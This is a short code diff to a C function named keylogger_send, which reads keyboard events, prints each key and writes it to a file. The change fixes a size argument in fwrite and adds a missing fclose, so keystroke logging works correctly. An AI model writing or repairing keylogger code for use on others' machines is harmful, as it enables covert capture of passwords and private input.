@@ -200,7 +200,7 @@ void *keylogger_send(void *args_input) {
                     if(events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                         printf("keylogger: %s\n", keycodes[events[i].code]);
                         //write to file
-                        if(fwrite(keycodes[events[i].code], sizeof(keycodes[events[i].code]), strlen(keycodes[events[i].code]), fp) <= 0) {
+                        if(fwrite(keycodes[events[i].code], sizeof(char), strlen(keycodes[events[i].code]), fp) <= 0) {
                             perror("fwrite keylogger");
                             exit(1);
                         }
@@ -212,6 +212,7 @@ void *keylogger_send(void *args_input) {
         }
     }
 
+    fclose(fp);
     printf("keylogger: exiting thread\n");
     free(keyboard_device);
     return NULL;
